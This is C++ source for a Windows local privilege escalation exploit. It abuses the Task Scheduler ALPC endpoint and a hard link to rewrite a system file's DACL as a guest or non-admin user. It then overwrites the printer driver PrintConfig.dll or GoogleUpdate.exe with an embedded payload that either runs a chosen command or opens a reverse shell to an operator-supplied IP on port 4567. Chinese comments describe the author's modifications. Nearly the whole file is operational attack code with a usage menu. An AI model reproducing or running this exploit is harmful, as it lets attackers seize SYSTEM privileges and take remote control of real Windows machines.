//***************************************************************//
// Windows LPE - Non-admin/Guest to system - by SandboxEscaper   //
//***************************************************************//

/* _SchRpcSetSecurity which is part of the task scheduler ALPC endpoint allows us to set an arbitrary DACL.
It will Set the security of a file in c:\windows\tasks without impersonating, a non-admin (works from Guest too) user can write here.
Before the task scheduler writes the DACL we can create a hard link to any file we have read access over.
This will result in an arbitrary DACL write.
This PoC will overwrite a printer related dll and use it as a hijacking vector. This is ofcourse one of many options to abuse this.
改成默认利用打印机执行命令针对win8及以上前提是打印机服务开启
添加谷歌浏览器利用反弹shell 解决无法利用win7和2008的问题关于谷歌浏览器服务有两个自己看看(不同权限)
本人菜还请各位大佬勿喷
*/

#include "resource.h"
#include "stdafx.h"
#include "rpc_h.h"
#include<Windows.h>
#include<wchar.h>
#include <xpsprint.h>
#include<xpsobjectmodel.h>
#include <fstream>
#include<comdef.h>
#include<iostream>
#include<time.h>
#pragma comment(lib, "rpcrt4.lib")
//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
using namespace std;

RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE *binding_handle)
{
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;
	status = RpcStringBindingCompose(L"c8ba73d2-3d55-429c-8e9a-c44f006f69fc", L"ncalrpc", 
		nullptr, nullptr, nullptr, &StringBinding);
	if (status == RPC_S_OK)
	{
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status)
		{
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (!status)
			{
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
			}
		}
	}

	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}

bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);

void RunExploit()
{
	RPC_BINDING_HANDLE handle;
	RPC_STATUS status = CreateBindingHandle(&handle);
	//赋予权限
	//These two functions will set the DACL on an arbitrary file (see hardlink in main), change the security descriptor string parameters if needed.	
	_SchRpcCreateFolder(handle, L"UpdateTask", L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)", 0);
	_SchRpcSetSecurity(handle, L"UpdateTask", L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)", 0);
}

wchar_t* Tasks(int wbg) {

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	hFind = FindFirstFile(L"C:\\Windows\\System32\\DriverStore\\FileRepository\\prnms003.inf_amd64*", &FindFileData);
	wchar_t BeginPath[MAX_PATH] = L"c:\\windows\\system32\\DriverStore\\FileRepository\\";
	wchar_t PrinterDriverFolder[MAX_PATH];
	wchar_t EndPath[23] = L"\\Amd64\\PrintConfig.dll";
	wmemcpy(PrinterDriverFolder, FindFileData.cFileName, wcslen(FindFileData.cFileName));
	FindClose(hFind);
	wcscat(BeginPath, PrinterDriverFolder);
	wcscat(BeginPath, EndPath);

	//生成UpdateTask进行硬链接
	if (wbg==1)
	{
		CreateNativeHardlink(L"c:\\windows\\tasks\\UpdateTask.job", BeginPath);
		return BeginPath;
	}
	else if (wbg==2)
	{
		CreateNativeHardlink(L"c:\\windows\\tasks\\UpdateTask.job", L"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe");
	}
}


DWORD WINAPI startSpooler(LPVOID pM){
	//CloseHandle(hFile);
	//启动一个打印机
	//CoInitialize(nullptr);
	IXpsOMObjectFactory *xpsFactory = NULL;
	CoCreateInstance(__uuidof(XpsOMObjectFactory), NULL, CLSCTX_INPROC_SERVER, __uuidof(IXpsOMObjectFactory), reinterpret_cast<LPVOID*>(&xpsFactory));
	HANDLE completionEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	IXpsPrintJob *job = NULL;
	IXpsPrintJobStream *jobStream = NULL;
	HRESULT ok = StartXpsPrintJob(L"Microsoft XPS Document Writer", L"Print Job 1", NULL, NULL, NULL, NULL, 0, NULL, &jobStream, NULL);
	//jobStream->Close();
	//CoUninitialize();
	exit(0);
}

DWORD WINAPI closeSpoolerWindows(LPVOID pM)
{
	HWND hwnd = FindWindowW(L"#32770", L"将打印输出另存为");
		if (hwnd)
		{
			PostMessage(hwnd, WM_CLOSE, 0, 0);
		}
	return 0;
}
int mainf(char*data,int wbg)
{
	

	if (wbg==1)
	{

		WIN32_FIND_DATA FindFileData;
		HANDLE hFind;
		hFind = FindFirstFile(L"C:\\Windows\\System32\\DriverStore\\FileRepository\\prnms003.inf_amd64*", &FindFileData);
		wchar_t BeginPath[MAX_PATH] = L"c:\\windows\\system32\\DriverStore\\FileRepository\\";
		wchar_t PrinterDriverFolder[MAX_PATH];
		wchar_t EndPath[23] = L"\\Amd64\\PrintConfig.dll";
		wmemcpy(PrinterDriverFolder, FindFileData.cFileName, wcslen(FindFileData.cFileName));
		FindClose(hFind);
		wcscat(BeginPath, PrinterDriverFolder);
		wcscat(BeginPath, EndPath);
		//默认
		HRSRC myResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
		unsigned int myResourceSize = SizeofResource(NULL, myResource);
		HGLOBAL myResourceData = LoadResource(NULL, myResource);
		LPBYTE p = (LPBYTE)GlobalAlloc(GPTR, myResourceSize);
		CopyMemory((LPVOID)p, (LPCVOID)LockResource(myResourceData), myResourceSize);
		memcpy((LPVOID)(p + 0x11337), data, 45);

		HANDLE hFile;
		DWORD dwBytesWritten = 0;
		do {
			hFile = CreateFile(BeginPath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			WriteFile(hFile, (LPCVOID)p, myResourceSize, &dwBytesWritten, NULL);
			if (hFile == INVALID_HANDLE_VALUE)
			{
				exit(0);
			}
		} while (hFile == INVALID_HANDLE_VALUE);
		
		CloseHandle(hFile);
		CreateThread(NULL, 0, startSpooler, NULL, 0, NULL);
		//Sleep(5000);
		while (!(FindWindowW(L"#32770", L"将打印输出另存为")))
		{
			CreateThread(NULL, 0, closeSpoolerWindows, NULL, 0, NULL);
		}
		
		Sleep(3000);
		//closeSpoolerWindows();
		return 0;
	}
	else if (wbg==2)
	{
		HRSRC myResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA3), RT_RCDATA);
		unsigned int myResourceSize = SizeofResource(NULL, myResource);
		HGLOBAL myResourceData = LoadResource(NULL, myResource);
		LPBYTE p = (LPBYTE)GlobalAlloc(GPTR, myResourceSize);
		CopyMemory((LPVOID)p, (LPCVOID)LockResource(myResourceData), myResourceSize);
		memcpy((LPVOID)(p + 0x105E8), data, 16);

		HANDLE hFile;
		DWORD dwBytesWritten = 0;
		do {
			hFile = CreateFile(L"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			WriteFile(hFile, (LPCVOID)p, myResourceSize, &dwBytesWritten, NULL);
			if (hFile == INVALID_HANDLE_VALUE)
			{
				exit(0);
			}
		} while (hFile == INVALID_HANDLE_VALUE);
		CloseHandle(hFile);
		return 0;
	}
		
}

void help() {
	cout << "Usage: -e command (Default method) Suitable for win8 or above" << endl;
	cout << "Usage: -g ip Reverse shell to 4567 port" << endl;
}
int main(int argc, char* argv[]) {
	//错误
	if (!(argc > 1))
	{
		help();
		exit(0);
	}
	//帮助
	else if (strcmp(argv[1], "-h") == 0) {
		help();
		exit(1);
	}
	
	//默认方法执行命令
	else if(strcmp(argv[1], "-e") == 0)
	{
		if (argc==3) {
			char arr[30];
			strcpy(arr, argv[2]);
			Tasks(1);
			RunExploit();
			mainf(arr, 1);
			return 0;
		}
		help();
		exit(0);
	}
	//利用谷歌浏览器更新服务
	else if (strcmp(argv[1], "-g") == 0)
	{
		if (argc == 3) {
			Tasks(2);
			RunExploit();
			mainf(argv[2],2);
			return 0;
		}
		help();
		exit(1);
	}
	//未完，等待优化和添加其他功能

}
	
